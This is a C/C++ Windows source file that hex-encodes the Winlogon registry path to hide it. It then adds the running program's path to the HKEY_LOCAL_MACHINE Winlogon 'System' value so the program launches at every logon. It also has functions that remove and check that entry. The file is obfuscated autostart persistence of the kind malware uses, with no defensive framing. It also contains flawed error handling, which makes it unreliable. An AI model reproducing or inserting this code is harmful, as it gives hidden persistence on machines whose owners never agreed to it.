
#define REGISTER_KEYNAME_SYSTEM TEXT("System")

static char WWM_SYSTEM_SHELL_REGISTRY_KEY[] // under HKEY_LOCAL_MACHINE
//	= "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" ;
	= "534f4654574152455c5c4d6963726f736f66745c5c57696e646f7773204e545c5c43757272656e7456657273696f6e5c5c57696e6c6f676f6e";


inline void hex2bin(char* src, char* dst, const size_t len)
{
	const char* end =src +len ;
	while (src < end) 
	{
		*dst = (*src>'9'?*src++-'a'+0x0a:*src++-'0') << 4 ;
		if (src <end)
		{
			*dst++ |= (*src>'9'?*src++-'a'+0x0a:*src++-'0') ;
		}
	}
}

const char*
GetProgramName(void)
{
	return __argv[0] ;
	//const char* strSep =strrchr(__argv[0], '\\') ;
	//return strSep ? strSep +1 : __argv[0] ;
}


#define GetProName \
	TCHAR szProgPath[MAX_PATH] ={'\0'}, szKeyValue[MAX_PATH] ={'\0'} ;\
	HKEY hKey ;\
	strcat(szProgPath, GetProgramName()) ;\
	strcat(szProgPath, TEXT(" ")) ;

#define OPENINIREG \
	char regeditrun[MAX_PATH * 2 ] ={'\0'} ;\
	hex2bin(WWM_SYSTEM_SHELL_REGISTRY_KEY ,regeditrun , strlen (WWM_SYSTEM_SHELL_REGISTRY_KEY) ) ;\
	printf("%s\n" , regeditrun) ;\
    if (FAILED(RegOpenKeyEx (\
            HKEY_LOCAL_MACHINE,\
            regeditrun,\
            0,\
            KEY_QUERY_VALUE | KEY_SET_VALUE,\
            &hKey)))\
    {\
		TRACE("failed to open register service.\n") ;\
        return -1;\
    }


int
RegisterSysInit(void)
{
	GetProName 
	OPENINIREG
	
	DWORD dwBufLen =sizeof(szKeyValue) ;
	DWORD dwType =REG_SZ ;
	if (FAILED(::RegQueryValueEx(hKey,
		REGISTER_KEYNAME_SYSTEM,
		0L,
		&dwType,
		(LPBYTE)szKeyValue,
		&dwBufLen)))
	{
		TRACE("failed to register service.\n") ;
	}
	else if (NULL == strstr(szKeyValue, szProgPath))
	{
		strcat(szProgPath, szKeyValue) ;
		
		if (FAILED(::RegSetValueEx(hKey,
			REGISTER_KEYNAME_SYSTEM,
			0L,
			REG_SZ,
			(CONST BYTE*)szProgPath,
			strlen(szProgPath))))
		{
			TRACE("failed to register service.\n") ;
		};
	}

	::RegCloseKey(hKey) ;

	return 0 ;
}

int 
CleanIniReg(void)
{
	GetProName 
	OPENINIREG

	TCHAR* psize = NULL ;
	DWORD dwBufLen =sizeof(szKeyValue) ;
	DWORD dwType =REG_SZ ;
	if (FAILED(::RegQueryValueEx(hKey,
		REGISTER_KEYNAME_SYSTEM,
		0L,
		&dwType,
		(LPBYTE)szKeyValue,
		&dwBufLen)))
	{
		TRACE("failed to register service.\n") ;
	}
	else if (NULL != ( psize = strstr(szKeyValue, szProgPath)) )
	{
		int szProglen = strlen(szProgPath) ;
		TCHAR* strtmp = psize + szProglen ;
		memset(psize , '\0',szProglen) ;
		strcat(szKeyValue , strtmp) ;
		if ( NULL == szKeyValue )
			strcpy(szKeyValue," ") ;
	
		if (FAILED(::RegSetValueEx(hKey,
			REGISTER_KEYNAME_SYSTEM,
			0L,
			REG_SZ,
			(CONST BYTE*)szKeyValue,
			strlen(szKeyValue))))
		{
			TRACE("failed to register service.\n") ;
		};
	}
	::RegCloseKey(hKey) ;
	return 0 ;		
}

int checkRun() 
{
	GetProName 
	OPENINIREG
	
	int  reval = 0 ;
	TCHAR* psize = NULL ;
	DWORD dwBufLen =sizeof(szKeyValue) ;
	DWORD dwType =REG_SZ ;
	if (FAILED(::RegQueryValueEx(hKey,
		REGISTER_KEYNAME_SYSTEM,
		0L,
		&dwType,
		(LPBYTE)szKeyValue,
		&dwBufLen)))
	{
		reval = 0 ;
	}
	else if (NULL != ( psize = strstr(szKeyValue, szProgPath)) )
	{
		reval = 1 ;
	}
	::RegCloseKey(hKey) ;
	return reval ;		
}
